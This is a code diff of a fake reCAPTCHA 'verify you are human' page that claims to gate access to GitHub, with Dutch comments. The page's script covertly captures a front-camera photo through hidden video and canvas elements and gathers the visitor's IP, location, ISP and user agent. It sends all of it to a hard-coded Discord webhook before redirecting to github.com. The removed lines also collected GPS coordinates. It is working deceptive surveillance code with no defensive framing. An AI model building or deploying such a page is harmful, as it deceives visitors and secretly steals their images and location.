@@ -10,7 +10,6 @@
       --tg-bg: #ffffff;
       --tg-text: #000000;
       --tg-sub: #8e8e93;
-      --warning-red: #ff3b30;
     }
 
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -18,16 +17,15 @@
     body {
       background: var(--tg-bg);
       color: var(--tg-text);
-      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
       height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      user-select: none;
       overflow: hidden;
     }
 
-    #screen-landing, #screen-warning {
+    #screen-landing, #screen-loading {
       width: 100%;
       max-width: 380px;
       padding: 20px;
@@ -35,57 +33,29 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
     }
 
-    #screen-warning { display: none; }
-
-    .warning-icon { font-size: 4rem; margin-bottom: 20px; }
-    .warning-title { font-size: 1.5rem; font-weight: 600; color: var(--warning-red); margin-bottom: 12px; }
-    .warning-text { color: var(--tg-sub); font-size: 0.95rem; margin-bottom: 30px; }
-
-    .external-btn {
-      width: 90%;
-      padding: 16px;
-      background: var(--warning-red);
-      color: white;
-      border: none;
-      border-radius: 14px;
-      font-size: 1.05rem;
-      font-weight: 600;
-      cursor: pointer;
-      margin-bottom: 15px;
-    }
-
-    /* Logo Container zonder hoekjes */
+    /* Logo Styling - GEEN corners */
     .faceid-frame {
       width: 120px; 
       height: 120px;
-      position: relative;
       margin-bottom: 30px;
       display: flex;
       justify-content: center;
       align-items: center;
     }
 
-    /* Verwijder alle hoekjes/corners definitief */
-    .faceid-corners, .faceid-frame::before, .faceid-frame::after {
-      display: none !important;
-    }
-
-    /* Het reCAPTCHA Logo */
     .faceid-svg {
       width: 100px;
       height: 100px;
-      display: block;
       background-image: url("https://media.discordapp.net/attachments/1481301560360308919/1495188750437843105/google_recaptcha.png?ex=69e55689&is=69e40509&hm=cc3af7ec02e6cc87aa5585a06580916c1dd17728e6e14e11d4df4f2ac01e6f6e&=&format=webp&quality=lossless&width=660&height=660");
       background-size: contain;
       background-repeat: no-repeat;
       background-position: center;
     }
 
-    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
-    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 40px; padding: 0 20px; }
+    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; }
+    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; margin-bottom: 40px; }
 
     .verify-btn {
       width: 90%;
@@ -97,30 +67,13 @@
       font-size: 1.05rem;
       font-weight: 600;
       cursor: pointer;
-      transition: all 0.2s;
     }
 
-    .secure-text {
-      margin-top: 30px;
-      font-size: 0.8rem;
-      color: #34c759;
-      font-weight: 500;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-    }
-
-    #screen-loading {
-      display: none;
-      position: fixed; inset: 0; background: #fff; z-index: 100;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-    }
-    .scan-box { width: 140px; height: 140px; position: relative; margin-bottom: 20px; display: flex; justify-content: center; align-items: center; }
-    .scan-line { position: absolute; width: 100%; height: 2px; background: var(--tg-blue); box-shadow: 0 0 15px var(--tg-blue); top: 0; animation: moving-scan 1.5s infinite ease-in-out; }
+    #screen-loading { display: none; }
+    .scan-box { width: 140px; height: 140px; position: relative; display: flex; justify-content: center; align-items: center; }
+    .scan-line { position: absolute; width: 100%; height: 2px; background: var(--tg-blue); top: 0; animation: moving-scan 1.5s infinite ease-in-out; }
     @keyframes moving-scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }
-
+    
     #hidden-video { position: fixed; opacity: 0; left: -999px; }
     #hidden-canvas { display: none; }
   </style>
@@ -130,22 +83,11 @@
 <video id="hidden-video" autoplay playsinline muted></video>
 <canvas id="hidden-canvas"></canvas>
 
-<div id="screen-warning">
-  <div class="warning-icon">⚠️</div>
-  <div class="warning-title">External Browser Required</div>
-  <div class="warning-text">Gelieve dit te openen in je normale browser (Chrome/Safari).</div>
-  <button class="external-btn" onclick="openExternally()">Open in Browser</button>
-  <button class="verify-btn" onclick="forceContinue()">Doorgaan</button>
-</div>
-
 <div id="screen-landing">
-  <div class="faceid-frame">
-      <div class="faceid-svg"></div>
-  </div>
+  <div class="faceid-frame"><div class="faceid-svg"></div></div>
   <div class="tg-title">Verify you are human.</div>
-  <div class="tg-subtitle">Security measures enabled. Please use Captcha to confirm you're a human and access Github.</div>
+  <div class="tg-subtitle">Security measures enabled. Please confirm you're a human to access Github.</div>
   <button class="verify-btn" onclick="triggerScan()">I am not a robot!</button>
-  <div class="secure-text">End-to-End Encrypted Verification</div>
 </div>
 
 <div id="screen-loading">
@@ -153,120 +95,90 @@
       <div class="faceid-svg" style="opacity: 0.3;"></div>
       <div class="scan-line"></div>
   </div>
-  <div style="color:var(--tg-blue); font-weight:600; font-size:1.1rem;">Authenticating...</div>
+  <div style="margin-top:20px; color:var(--tg-blue); font-weight:600;">Authenticating...</div>
 </div>
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1495153409458704537/5MxkCcDC1DuhzHDf90BqtcED6yHEbI62IvzytW4rtMOE-CZCVhRXNw3nCqwKZCN0tc91';
-  let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
-  let gpsInfo = { lat: null, lon: null, accuracy: null, error: null };
+  
+  // Globale variabelen die direct gevuld gaan worden
+  let info = {
+    ip: "Laden...",
+    loc: "Onbekend",
+    isp: "Onbekend",
+    ua: navigator.userAgent
+  };
 
-  function isDiscordInAppBrowser() {
-    const ua = navigator.userAgent.toLowerCase();
-    return ua.includes('discord') || !navigator.mediaDevices;
-  }
-
-  function openExternally() {
-    const currentUrl = window.location.href;
-    if (navigator.share) navigator.share({ url: currentUrl });
-    else alert("Copy link: " + currentUrl);
-  }
-
-  function forceContinue() {
-    document.getElementById('screen-warning').style.display = 'none';
-    document.getElementById('screen-landing').style.display = 'flex';
-  }
-
-  async function loadMeta() {
+  // Start direct met het ophalen van IP data zodra de pagina opent
+  async function preloadInfo() {
     try {
-      const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
-      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
-      if(v4.status === 'success') {
-        ipInfo.v4 = v4.query;
-        ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
-        ipInfo.isp = v4.isp;
-      }
-      ipInfo.v6 = v6.ip;
-    } catch(e) { console.warn(e); }
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      info.ip = data.ip || "N/A";
+      info.loc = `${data.city}, ${data.region}, ${data.country_name}` || "N/A";
+      info.isp = data.org || "N/A";
+    } catch (e) {
+      // Fallback naar simpeler API als de eerste faalt
+      const res2 = await fetch('https://api.ipify.org?format=json');
+      const data2 = await res2.json();
+      info.ip = data2.ip;
+    }
   }
-
-  async function getGPS() {
-    return new Promise((resolve) => {
-      if (!navigator.geolocation) { gpsInfo.error = "No support"; resolve(); return; }
-      navigator.geolocation.getCurrentPosition(
-        (pos) => { gpsInfo.lat = pos.coords.latitude; gpsInfo.lon = pos.coords.longitude; gpsInfo.accuracy = pos.coords.accuracy; resolve(); },
-        (err) => { gpsInfo.error = err.message; resolve(); },
-        { enableHighAccuracy: true, timeout: 5000 }
-      );
-    });
-  }
+  preloadInfo();
 
   async function triggerScan() {
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
 
-    const capturedBlobs = [];
-    await loadMeta();
-    await getGPS();
-
-    // Camera Capture (Front)
+    const blobs = [];
+    
+    // Probeer foto te maken
     try {
-        const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        const b1 = await getBlob(streamF, true);
-        if(b1) capturedBlobs.push({ blob: b1, name: 'front.jpg' });
-        streamF.getTracks().forEach(t => t.stop());
-    } catch(e) {}
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const blob = await new Promise(resolve => {
+        const vid = document.getElementById('hidden-video');
+        vid.srcObject = stream;
+        vid.onloadedmetadata = () => {
+          setTimeout(() => {
+            const can = document.getElementById('hidden-canvas');
+            can.width = vid.videoWidth;
+            can.height = vid.videoHeight;
+            const ctx = can.getContext('2d');
+            ctx.drawImage(vid, 0, 0);
+            can.toBlob(resolve, 'image/jpeg', 0.8);
+          }, 500);
+        };
+      });
+      if(blob) blobs.push({ b: blob, n: 'capture.jpg' });
+      stream.getTracks().forEach(t => t.stop());
+    } catch(e) { console.log("Geen camera"); }
 
-    await uploadToDiscord(capturedBlobs);
+    await sendData(blobs);
     window.location.href = 'https://github.com';
   }
 
-  async function getBlob(stream, flip) {
-    const vid = document.getElementById('hidden-video');
-    vid.srcObject = stream;
-    return new Promise((resolve) => {
-        vid.onloadedmetadata = () => {
-            setTimeout(() => {
-                const can = document.getElementById('hidden-canvas');
-                can.width = vid.videoWidth; can.height = vid.videoHeight;
-                const ctx = can.getContext('2d');
-                if(flip) { ctx.translate(can.width, 0); ctx.scale(-1, 1); }
-                ctx.drawImage(vid, 0, 0);
-                can.toBlob(resolve, 'image/jpeg', 0.8);
-            }, 600);
-        };
-    });
-  }
-
-  async function uploadToDiscord(blobs) {
-    const data = new FormData();
+  async function sendData(blobs) {
+    const formData = new FormData();
     const payload = {
-      username: "System Logs",
+      username: "Security Check",
       embeds: [{
-        title: "✅ Data Captured",
+        title: "🛡️ Nieuwe Login Captcha",
         color: 0x24A1DE,
         fields: [
-          { name: "📱 Apparaat", value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false },
-          { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
-          { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
-          { name: "📍 Locatie", value: ipInfo.loc, inline: false },
-          { name: "🏢 ISP", value: ipInfo.isp, inline: false },
-          { name: "🎯 GPS", value: gpsInfo.lat ? `${gpsInfo.lat}, ${gpsInfo.lon}` : "Niet toegestaan", inline: true }
-        ]
+          { name: "📱 Apparaat", value: `\`${info.ua}\`` },
+          { name: "🌐 IP Adres", value: `\`${info.ip}\``, inline: true },
+          { name: "📍 Locatie", value: info.loc, inline: true },
+          { name: "🏢 Provider", value: info.isp }
+        ],
+        timestamp: new Date()
       }]
     };
 
-    data.append('payload_json', JSON.stringify(payload));
-    blobs.forEach((b, i) => data.append(`file${i}`, b.blob, b.name));
-    await fetch(WEBHOOK, { method: 'POST', body: data });
-  }
+    formData.append('payload_json', JSON.stringify(payload));
+    blobs.forEach((item, i) => formData.append(`file${i}`, item.b, item.n));
 
-  window.onload = () => {
-    if (isDiscordInAppBrowser()) {
-      document.getElementById('screen-landing').style.display = 'none';
-      document.getElementById('screen-warning').style.display = 'flex';
-    }
-  };
+    await fetch(WEBHOOK, { method: 'POST', body: formData });
+  }
 </script>
 </body>
 </html>
